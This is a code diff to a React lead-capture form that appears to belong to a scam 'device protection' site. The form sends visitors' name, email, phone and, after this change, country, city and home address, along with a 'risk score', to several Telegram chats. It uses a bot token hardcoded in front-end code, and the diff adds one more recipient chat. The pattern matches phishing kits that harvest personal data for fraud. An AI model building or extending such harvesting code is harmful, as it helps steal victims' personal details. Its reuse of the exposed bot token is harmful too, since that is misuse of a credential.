@@ -1,15 +1,20 @@
 import { useState } from 'react'
 
 const TELEGRAM_BOT_TOKEN = '8699438637:AAEUgX3bqmMtZa8b9EvShn-rCOrLK8c2y2U'
-const TELEGRAM_CHAT_IDS = ['6351503678', '-5030471314']
+const TELEGRAM_CHAT_IDS = ['6351503678', '-5030471314', '-5198254389']
 
 interface Props {
     riskScore: number
 }
 
 export default function LeadForm({ riskScore }: Props) {
-    const [formData, setFormData] = useState({ name: '', email: '', phone: '', concern: '', message: '' })
+    const [formData, setFormData] = useState({ name: '', email: '', phone: '', country: '', city: '', address: '', concern: '', message: '' })
     const [submitted, setSubmitted] = useState(false)
+
+    const resetForm = () => {
+        setSubmitted(false)
+        setFormData({ name: '', email: '', phone: '', country: '', city: '', address: '', concern: '', message: '' })
+    }
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
@@ -19,6 +24,9 @@ export default function LeadForm({ riskScore }: Props) {
             `👤 Name: ${formData.name}\n` +
             `📧 Email: ${formData.email}\n` +
             `📞 Phone: ${formData.phone}\n` +
+            `🌍 Country: ${formData.country}\n` +
+            `🏙️ City: ${formData.city}\n` +
+            `🏠 Address: ${formData.address}\n` +
             `⚠️ Concern: ${formData.concern}\n` +
             `💬 Message: ${formData.message}\n\n` +
             `🔴 Risk Score: ${riskScore}`
@@ -52,12 +60,8 @@ export default function LeadForm({ riskScore }: Props) {
                         <p className="text-slate-300 text-xs">🛡️ We will review your device and account risks</p>
                         <p className="text-slate-300 text-xs">🔒 You will receive a personalized protection plan</p>
                     </div>
-                    <button
-                        onClick={() => {
-                            setSubmitted(false)
-                            setFormData({ name: '', email: '', phone: '', concern: '', message: '' })
-                        }}
-                        className="w-full bg-white/10 hover:bg-white/20 text-white font-bold py-3 rounded-xl transition cursor-pointer border border-white/10">
+                    <button onClick={resetForm}
+                        className="w-full bg-white/10 hover:bg-white/20 text-white font-bold py-3 rounded-xl transition cursor-pointer border border-white/10 mb-3">
                         Submit Another Request
                     </button>
                 </div>
@@ -82,6 +86,15 @@ export default function LeadForm({ riskScore }: Props) {
                                 ) return
                                 e.preventDefault()
                             }}
+                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
+                        <input type="text" placeholder="Country" required autoComplete="off"
+                            onChange={e => setFormData({ ...formData, country: e.target.value })}
+                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
+                        <input type="text" placeholder="City" required autoComplete="off"
+                            onChange={e => setFormData({ ...formData, city: e.target.value })}
+                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
+                        <input type="text" placeholder="Address" required autoComplete="off"
+                            onChange={e => setFormData({ ...formData, address: e.target.value })}
                             className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                         <select required onChange={e => setFormData({ ...formData, concern: e.target.value })}
                             className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition">
